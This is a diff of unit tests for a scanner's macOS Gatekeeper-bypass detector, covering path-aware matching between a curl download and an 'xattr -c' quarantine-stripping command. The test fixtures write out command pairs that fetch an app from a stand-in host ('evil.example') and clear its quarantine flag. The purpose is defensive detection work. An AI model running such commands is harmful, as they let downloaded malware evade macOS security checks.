@@ -162,4 +162,32 @@ describe('SMI-6033 Wave 3: gatekeeper_bypass tiering + trust-tier carve-out', ()
     const f = gb(scanner.scan('t', content, true).findings)
     expect(f[0].severity).toBe('medium')
   })
+
+  // SMI-6033 Wave 3 (adversarial-review fix): the shared fetch-correlation
+  // utility is directory-path-aware, so a coincidental BASENAME collision
+  // between two unrelated files can no longer supply the provenance condition
+  // that makes this detector standalone-critical.
+  it('FP: an xattr target that only shares a BASENAME with the fetch destination (different directories) stays medium', () => {
+    const content =
+      'curl -o /tmp/Helper.app https://vendor.example/Helper.app\n' +
+      'xattr -c ./vendor/other-tool/Helper.app'
+    const report = scanner.scan('t', content)
+    const f = gb(report.findings)
+    expect(f.length).toBeGreaterThan(0)
+    expect(f[0].severity).toBe('medium')
+  })
+
+  it('TP control: the SAME directory on both sides still correlates -> critical', () => {
+    const content =
+      'curl -o /tmp/Helper.app https://vendor.example/Helper.app\nxattr -c /tmp/Helper.app'
+    expect(gb(scanner.scan('t', content).findings)[0].severity).toBe('critical')
+  })
+
+  it('TP control: a bare-filename fetch destination still correlates with a full-path xattr target (no path info on the fetch side)', () => {
+    // `curl -o EvilApp.app` names no directory at all, so there is no path
+    // information to distinguish it by — final-segment matching must stand.
+    const content =
+      'curl -o EvilApp.app https://evil.example/EvilApp.app\nxattr -c /Applications/EvilApp.app'
+    expect(gb(scanner.scan('t', content).findings)[0].severity).toBe('critical')
+  })
 })
